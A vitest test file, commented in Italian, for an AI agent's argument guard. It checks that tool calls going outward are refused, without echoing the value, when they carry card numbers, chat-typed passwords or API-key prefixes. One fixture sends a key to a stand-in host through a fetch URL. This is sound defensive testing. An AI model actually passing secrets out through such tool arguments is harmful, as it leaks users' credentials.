// Fase token (T8): i controlli FISSI di sicurezza, PURI — non dipendono dal
// modello. (a) un blocco <evento> esterno nel messaggio contamina il turno;
// (b) un argomento che va verso l'esterno o verso un sito con dentro un
// numero di carta (Luhn, 13-19 cifre), un valore che l'utente ha scritto in
// chat dopo «password / chiave / token / pin», o un prefisso noto di chiave,
// viene RIFIUTATO senza esecuzione e il valore non compare nel messaggio.
import { describe, expect, it } from 'vitest'
import {
  hasExternalEvento, luhnCardNumbers, knownKeyPrefixHits, chatSecretValues,
  argGuardVerdict, GUARDED_ARG_TOOLS
} from '../arg-guard'

describe('fase token (T8a): il blocco <evento> esterno contamina il turno', () => {
  it('un messaggio col blocco <evento> è contaminato', () => {
    expect(hasExternalEvento('[routine "P": p]\n\n<evento>\nsource: email\n{"da": "x"}\n</evento>')).toBe(true)
  })
  it('la menzione del TAG dentro altro testo non basta: serve il blocco', () => {
    expect(hasExternalEvento('parliamo del blocco evento senza aprirlo')).toBe(false)
    expect(hasExternalEvento('ciao')).toBe(false)
  })
})

describe('fase token (T8b): Luhn, prefissi di chiave, segreti scritti in chat', () => {
  it('un numero di carta valido passa Luhn e viene trovato (13-19 cifre, anche a spazioli)', () => {
    // 4539 1488 0343 6467 è una Visa di test valida
    expect(luhnCardNumbers('paga con 4539148803436467 per favore')).toEqual(['4539148803436467'])
    expect(luhnCardNumbers('carta 4539 1488 0343 6467 ok')).toEqual(['4539148803436467'])
  })
  it('NESSUN falso positivo: numero d\'ordine a 8 cifre, CAP, data', () => {
    expect(luhnCardNumbers('ordine 12345678 del 2026-11-08')).toEqual([])
    expect(luhnCardNumbers('CAP 40121, civico 21')).toEqual([])
    // e un numero di 13-19 cifre che NON passa Luhn non conta
    expect(luhnCardNumbers('id 1234567890123456789')).toEqual([])
  })
  it('i prefissi noti di chiave', () => {
    expect(knownKeyPrefixHits('usa sk-abc123DEF per la chiamata')).toEqual(['sk-abc123DEF'])
    expect(knownKeyPrefixHits('tokens: ghp_AAAABBBB1234 e xoxT-12345678 e secret_zzz e ak_9x8y')).toContain('ghp_AAAABBBB1234')
    expect(knownKeyPrefixHits('xoxT-12345678')).toEqual(['xoxT-12345678'])
  })
  it('i valori scritti in chat dopo password/chiave/token/pin (anche in italiano)', () => {
    const chat = [
      'la mia password è Tr4pp0la!92',
      'il token: abc-123-def',
      'chiave api sk-xyz999',
      'pin 5521'
    ]
    const vals = chatSecretValues(chat)
    expect(vals).toContain('Tr4pp0la!92')
    expect(vals).toContain('abc-123-def')
    expect(vals).toContain('sk-xyz999')
    // il PIN di 4 cifre è troppo corto per essere utile da solo, ma la regola
    // dei prefissi/Luhn copre i valori pericolosi; qui si chiedono ≥6 caratteri
    expect(vals).not.toContain('5521')
  })
})

describe('fase token (T8b): argGuardVerdict rifiuta senza esecuzione e senza il valore', () => {
  const chat = ['la mia password è Tr4pp0la!92', 'la chiave è sk-supersegreta123']

  it('browser_type con dentro il numero di carta → rifiutato, il valore NON compare', () => {
    const v = argGuardVerdict('browser_type', { ref: 'e6', text: '4539 1488 0343 6467' }, chat)
    expect(v.ok).toBe(false)
    if (!v.ok) {
      expect(v.reason).not.toContain('4539')
      expect(v.reason.toLowerCase()).toContain('request_secure_input')
    }
  })
  it('browser_type con la password scritta in chat → rifiutato', () => {
    const v = argGuardVerdict('browser_type', { ref: 'e5', text: 'Tr4pp0la!92' }, chat)
    expect(v.ok).toBe(false)
  })
  it('fill_credential con la password scritta in chat → rifiutato', () => {
    const v = argGuardVerdict('fill_credential', { loginId: 'x', username_ref: 'e1' }, chat)
    expect(v.ok).toBe(true) // fill_credential non passa VALORI: solo i ref — ok
    const v2 = argGuardVerdict('fill_credential', { loginId: 'x', username_ref: 'e1', password: 'Tr4pp0la!92' }, chat)
    expect(v2.ok).toBe(false)
  })
  it('offer_connector con la chiave nel reason → rifiutato, il valore NON compare', () => {
    const v = argGuardVerdict('offer_connector', { id: 'gcal', reason: 'uso la chiave sk-supersegreta123' }, chat)
    expect(v.ok).toBe(false)
    if (!v.ok) expect(v.reason).not.toContain('sk-supersegreta123')
  })
  it('run-command con la carta in una stringa del comando → rifiutato', () => {
    const v = argGuardVerdict('run-command', { command: 'echo 4539148803436467' }, chat)
    expect(v.ok).toBe(false)
  })
  it('web_fetch: SOLO l\'url viene guardato', () => {
    const v = argGuardVerdict('web_fetch', { url: 'https://x.example/a?k=sk-abc123def' }, chat)
    expect(v.ok).toBe(false)
  })
  it('i tool guardati sono quelli che vanno verso l\'esterno o verso un sito', () => {
    for (const t of ['browser_type', 'browser_select', 'draft_external', 'send_to_agent', 'offer_connector', 'add_mcp_server', 'web_fetch', 'run-command', 'fill_credential']) {
      expect(GUARDED_ARG_TOOLS.has(t), t).toBe(true)
    }
    expect(GUARDED_ARG_TOOLS.has('read-file')).toBe(false)
  })
  it('nessun falso positivo: testi normali passano', () => {
    expect(argGuardVerdict('browser_type', { ref: 'e4', text: 'ciao, come va?' }, chat).ok).toBe(true)
    expect(argGuardVerdict('run-command', { command: 'ls -la' }, chat).ok).toBe(true)
    expect(argGuardVerdict('send_to_agent', { agentId: 'b1', text: 'ricorda l\'ordine 12345678' }, chat).ok).toBe(true)
  })
})
